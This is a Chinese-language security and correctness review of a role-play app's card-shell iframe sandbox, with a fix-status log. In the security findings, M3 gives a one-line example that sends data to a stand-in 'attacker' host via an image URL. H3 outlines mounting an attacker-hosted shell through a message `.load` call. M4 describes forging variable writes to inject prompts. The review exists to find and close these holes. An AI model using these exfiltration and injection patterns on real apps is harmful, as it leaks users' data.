# Card-Shell 前端美化线评审（2026-07-26）

> 评审对象：card-shell 表现层全线**工作树状态**（含未提交 WIP）：CardShellHost.vue、
> cardShellDocument/Presentation/FetchProxy/OpeningChat/VariableStore/Worldbook.js、
> plugin-bridge.js、ShellAwareContent.vue、MvuJsRuntime/TavernHelperRuntime.vue、
> shellVariableOutbox.js、AppV2.vue 壳接线、card_shell_cache.rs、domain card_shell.rs。
> 方法：3 视角（WIP 正确性 / 沙箱安全 / 验收卡适配度）并行查找 + 逐条对抗性核实
> （21 个只读代理；每条发现要求 file:line 证据 + 可达失败场景，核实不过即驳回）。
> 结论：**17 条确认（5 高 / 5 中 / 7 低），1 条驳回**。
> 关联：`ARCHITECTURE-REVIEW-2026-07-26.md` 的 V3（开场不落库）在 WIP 中复现且更严重；
> V5（CSP null）/V6（插件越权）家族在本线均有具体利用路径。

## HIGH（5）

### H1 Campaign 开场选择从不落库（V3 现形）
- `frontend/src/AppV2.vue:397-442`：`onOpeningShellApplied` 的 Campaign 分支只改前端
  `writing.messages`，不调任何持久化 API（对照 useMessageVariants.js 全部走 Tauri 命令）。
- 后端会话由 `create_campaign_in_store`（lib.rs:9700-9705）以表单选中开场种子。
- 失败场景：用户在命定之诗开场壳选场景 2 →「开始旅程」→ UI 显示场景 2，但下一轮
  `start_writing` 从后端树（仍是 first_mes）生成，随后 `applyConversation` 覆盖前端消息，
  **无需重启即静默回退**。修复方向：应用选择时调用后端首消息改写（或变体切换）命令。

### H2 遗留 activeCharDetail 劫持 Campaign 开场种子
- `AppV2.vue:234-235 / 398-400`：`fromStore.length ? fromStore : cardShellOpeningGreetings`
  —— `writing.greetingOptions` 源于 `campaign.activeCharDetail`（旧角色残留），优先级高于
  Campaign 卡自己的 greetings；建 Campaign 全程不清 activeCharDetail。
- 失败场景：先点旧角色 A，再从卡 B 建 Campaign → B 的开场壳 swipes 全是 A 的开场文本，
  选中后把 A 的文本写进 B 的会话。该缺陷直接击穿 WIP 自己在
  `cardShellPresentation.js:29-49` 建立的「旧角色不得覆盖 Campaign 卡」不变量。
- 修复方向：Campaign 态一律用 cardShellOpeningGreetings；或建 Campaign 时清 activeCharDetail。

### H3 默认白名单含任意上传 CDN + 消息内 .load 可挂壳 = 远程代码链
- `card_shell_cache.rs:32-47`：catbox.moe / raw.githubusercontent / github / gitee /
  cdn.jsdelivr 均为任意用户内容主机，`is_url_allowed` 只查 host。
- ShellAwareContent 会挂载消息 display_content 里任何 `$('body').load('https://…')`。
- 失败场景：卡正则把自身输出改写为 `.load('https://files.catbox.moe/<攻击者>.html')` →
  下一条消息即挂载攻击者壳，获得完整 bridge 权限（叠加 M3 无 CSP = 任意外传）。
- 修复方向：挂壳 URL 与图片/资源 URL 分级——壳只允许 pin 版可信源或用户显式确认；
  或至少对消息内动态 .load 弹确认。

### H4 内联 MessageHtml 壳完全不执行——两张验收卡的内联 UI 全灭
- 仅 `.load(url)` 型壳会进 CardShellHost 沙箱（cardShellDisplay.js:7-8）；其余落
  RichContent，DOMPurify 剥 script/iframe。CardShellHost 有 `html` prop 但无调用方传入；
  manifest 对 >8KB InlineHtml 清空正文（card_shell.rs:175-179）且无命令恢复。
- 影响：卿卿 自选开场 52K / 状态栏 68K（含 Mvu 调用）/ 修炼界面 171K / 战斗系统 89K
  全部渲染为剥壳静态文本；命定之诗 4 个内联界面（命运抽卡/战斗美化/角色查看器×2）同灭。
- 修复方向：为 InlineHtml 壳打通「按 label 取回正文 → blob 文档 → CardShellHost」通道
  （TH 内联脚本已有同型机制可仿）。

### H5 卿卿【开场介绍】不被识别为开场壳
- `card_shell.rs:297-315` classify_shell_kind 关键词表：首页/customized/自定义/
  StatusPlaceHolder/状态栏 + URL 片段 /home//custom_start//status/。【开场介绍】+
  aireckchen-dot 路径全 miss → MessageHtml → AppV2 开场面从不武装。
- 已对实卡验证：卿卿唯一 .load 壳即 开场介绍（first_mes 就是【开场介绍】标记）。
- 修复方向：关键词表加 开场/开场介绍/intro；长期应改为「first_mes 命中 find-regex 的
  .load 壳即开场壳」的结构性判定，摆脱关键词枚举。

## MEDIUM（5）

### M1 openingChatSeed 深 watch 重建进行中的设置 iframe
- `CardShellHost.vue:938-944` deep watch + 父级 computed 每次求值返回新对象
  （AppV2.vue:232-245）→ 无关状态变化（导入角色等）即 loadShell() 重建 iframe，
  表单清空；`activeBridgeSession` 同步 bump 使旧 iframe 在飞 ask 挂到 120s 超时，
  「开始旅程」按钮表现为假死。修复：seed 做内容比较或去掉 deep、用稳定 key。

### M2 双壳 replace 模式用过期快照互相抹写
- `cardShellDocument.js:127` 区间：updateVariablesWith/deleteVariable/replaceMvuData
  基于 iframe 本地 SELECTOR_VARIABLES（构建时注入一次，永不刷新）计算整桶 replace；
  队列只串行化写入顺序，不解决快照过期。开场壳写的主题键会被状态壳的 stale 整桶覆盖。
  修复：replace 前经宿主做桶级 RMW，或写入走 key 级 merge。

### M3 包装文档无 CSP；fetch 之外全部通道绕过白名单
- `CardShellHost.vue:719-730` headInject 无 CSP meta；tauri.conf.json csp:null。
  `<img>/<script src>/XHR/CSS url()` 直连网络。壳文档内含全部开场白种子 + 变量桶 →
  `new Image().src='https://attacker/?d='+…` 即静默外传。
- 修复：向包装文档注入 CSP（img-src/script-src 接同一套白名单 + 用户扩展），
  与 ARCHITECTURE-REVIEW V5 同一工程。

### M4 卡 JS 可 var_write 直写一等 Campaign/实例变量
- 会话 token 发布在 `window.__sfShellBridgeSession`（CardShellHost.vue:389，页面脚本可读），
  卡 JS 可伪造 `var_write` → setCampaignVariable/setCharacterVariable 任意键值，
  越过 `__storyforge_card_shell_variables` 命名空间桶，等于对下一轮的提示词注入。
- 修复：壳的变量写入全部改走 ProposeVariableUpdate（预览/补丁通道），
  与既有权限矩阵「WriteVariables=legacy、Propose=preferred」一致。

### M5 可见壳的 Mvu shim 读不到真实 MVU 状态
- `cardShellDocument.js:155-160` Mvu 仅 runtime/isReady/getMvuData/replaceMvuData，
  getMvuData 只读壳自写的选择器桶；真实 stat_data（管线/MVU 运行时写入）不可见；
  `Mvu.events` 未定义 → `eventOn(Mvu.events.…)` 抛 TypeError 使整段内联脚本中止。
- 修复：getMvuData 桥接真实 campaign 变量读取（只读）+ 补 events 常量表。

## LOW（7）

- **L1** `cached_optional_map_fallback` 先于 read_cache 判定（card_shell_cache.rs:236/239）：
  标准图先缓存后超清图永不可达，40MiB 上限与 Range 逻辑成死代码。
- **L2** 变量并发测试未测并发：enqueueCardShellVariableMutation 零覆盖；
  fetch-proxy 地图遮罩测试只 regex 匹配脚本源码不执行。
- **L3** isTrustedSource 的 pluginId 回退（CardShellHost.vue:948-955）：数据字段匹配即信任，
  不校验 event.source；深度防御缺口（利用价值低，降为 low）。
- **L4** 壳虚拟插件授 ReadMemory 且 get_conversation 后端无插件门禁（V6 家族）：
  前端权限数组是唯一边界；当下因壳内拿不到会话 id 而难利用。
- **L5** i.postimg.cc 不在白名单：壳内 fetch() 到它硬失败；647 个 `<img>` 直连网络
  不缓存不代理。需加白名单 + 图片通道的降级策略。
- **L6** 未 pin 依赖（MagVarUpdate@beta、gh 无 tag）首取即永久冻结：缓存无 TTL/ETag/
  清理命令，多文件壳可能永久混版本。需刷新/清缓存命令。
- **L7** 卿卿 bgm/图鉴/cg（57-99K 内联 TH 脚本）在 0×0 不可见 iframe 中执行：
  状态条显示 ok 但 UI 永不可见、自动播放无用户手势必被拦。

## 驳回（1）

- 「iframe 内 bridge 回复处理器接受兄弟帧伪造响应实现跨壳注入」——代码观察属实
  （仅按 id 过滤），但按所述路径不可达，不构成利用链。

## 与验收线的关系

同日的卡片翻译验收（`crates/harness-real-llm/tests/card_translation_acceptance.rs`）
证明翻译线已能从两张验收卡抽取角色/schema/规则；本评审证明宿主线对同两张卡的
UI 保真仍有 H4/H5/M5/L7 级缺口。两线结论互证「翻译为主干、沙箱做表现层且
需先补墙（M3/M4 → V5/V6）」的方向判断。

## 建议修复顺序

1. H1+H2（开场功能正确性——当前 WIP 的核心交付）
2. M3+M4+H3（安全三件套：CSP、Propose 化、挂壳来源分级——扩面前先补墙）
3. H4+H5（卿卿类卡的 UI 通路）
4. M1/M2/M5 → L 系列

## 修复状态（2026-07-26 同日）

前 7 条已修复入库（每条一 commit，带回归测试；cargo test --workspace +
npm test + vitest 全绿）：

| 条目 | commit | 方案摘要 |
|---|---|---|
| H1 | a25ae8f | 新增 `apply_campaign_opening` 命令（开场态校验 + edit_variant 落库）；前端 `rewriteOpeningMessages` 纯函数 + Campaign 分支同步调用 |
| H2 | f5ac264 | `selectOpeningGreetingOptions`：campaign 态一律用卡 greetings，空也不回退残留 |
| M3 | f3f9d54 | `buildShellCspMetaTag` 注入包装文档：default-src 'none'，网络向指令钉白名单，获取失败 fail closed |
| M4 | 591a2c1 | var_write → 提案队列 + `ShellVariableProposalBar` 确认条；用户点击的 MVU 交互保持直写 |
| H3 | 30b9912 | 消息 .load 仅卡 manifest 注册 URL 自动挂载，其余确认卡（本会话有效）；无信任上下文 fail closed |
| H4 | 43a33ab | display 内含 script 的完整 HTML 文档 → CardShellHost html prop 沙箱挂载；信任锚=源文命中 manifest InlineHtml find_regex。偏离评审建议的「按 label 取回正文」：display_content 已带插值后正文，按 label 取回反丢捕获组，故不需要恢复命令 |
| H5 | abde7b1 | classify_shell_kind 补 开场/intro//intro/ → OpeningCustom；状态判定提前；前端 classifyShellUrl 同步 |

未处理：M1/M2/M5、L1-L7。

### 低危清尾（2026-07-27）

M1/M2/M5 与 L1/L2/L3/L5/L6 已修复入库（cargo + node + vitest 全绿）：

| 条目 | 方案摘要 |
|---|---|
| M1 | CardShellHost 重载 watch 改比内容指纹（JSON 序列化 url/html/campaignId/openingChatSeed），无关状态变化不再重建进行中的设置 iframe |
| M2 | 壳侧 replace 家族（setVariables/updateVariablesWith/deleteVariable/replaceMvuData）改发相对本壳快照的键级补丁（sets/deletes，`mode:"patch"`），宿主 `patchCardShellVariables` 按键应用；本壳未触碰的键存活。merge/replace 协议保留兼容已挂载旧壳 |
| M5 | Mvu shim：注入真实 Campaign 变量树快照（`buildMvuStatDataTree`，点记法键按段展开）作 stat_data 只读底座，壳自写桶键级覆盖；`mvu_data_get` 桥可刷新（init + waitGlobalInitialized 各刷一次，另暴露 `Mvu.refreshMvuData`）；补 `Mvu.events` 常量表（缺失时 eventOn TypeError 杀死整段内联脚本）。写侧保持沙箱桶不变（与 M4 一致） |
| L1 | fetch 顺序改为自身缓存命中 → 标准图兜底 → 网络；超清图缓存过即可命中，不再被标准图永久劫持。防卡死语义保留（未缓存的超清图仍不发起网络请求） |
| L2 | `enqueueCardShellVariableMutation` 并发测试补齐（同 campaign 串行、异 campaign 互不阻塞、前驱失败不阻塞后继）；顺带修掉队列尾巴 rejection 未处理触发 unhandledRejection 的真实小 bug |
| L3 | `isTrustedSource` 去掉「data.pluginId 字段匹配即信任」回退，改为 event.source 沿 parent 链归属本壳 iframe（嵌套子 iframe 的 TH 消息在链上，功能不回退） |
| L5 | `i.postimg.cc` 加入默认白名单（点名主机，不放开任意图床）；卿卿立绘/图鉴走 fetch 代理 + 缓存 |
| L6 | 新增 `card_shell_clear_cache` 命令 + 前端 wrapper `cardShellClearCache`：清空磁盘缓存作为未 pin 依赖的显式刷新通道（UI 入口后续接） |

**维持不修（评估记录）**：
- **L4**（get_conversation 后端插件门禁）：纵深防御项，需要后端权限矩阵扩展；
  当下壳内拿不到会话 id，难利用。留待权限体系统一工程（V6 家族）。
- **L7**（bgm/图鉴/cg 在 0×0 iframe 执行）：需要可见挂载的产品决策（消息区
  内嵌 vs 独立面板）+ 自动播放手势策略，不是缺陷修复能覆盖的范围。

### 后续跟进（同日）

- **消息壳原地渲染**：H4 通路的完成形态。`segmentShellContent`（cardShellDisplay.js）
  单遍 span 认领（围栏胶水→body-script 胶水→裸 .load→内联文档），输出有序
  text/shell 分段；ShellAwareContent 改为逐段渲染，壳出现在原文位置，不再吊顶。
  语义保持：同 URL 首现渲染后续剥离、无壳消息逐字节原样、suppress 仅作用于
  .load 壳（内联无 URL 不参与）。流式尾部追加时段偏移稳定（key 不变），全文
  改写允许内联壳一次性重挂（测试显式承认）。新增 CardShellHost 沙箱等价测试：
  :html 与 :url 同 sandbox 属性、html 路径断言 CSP + bridge 注入。确认门兼作
  重内联壳的懒加载闸门——将来「记住信任」不得改成全自动挂载。
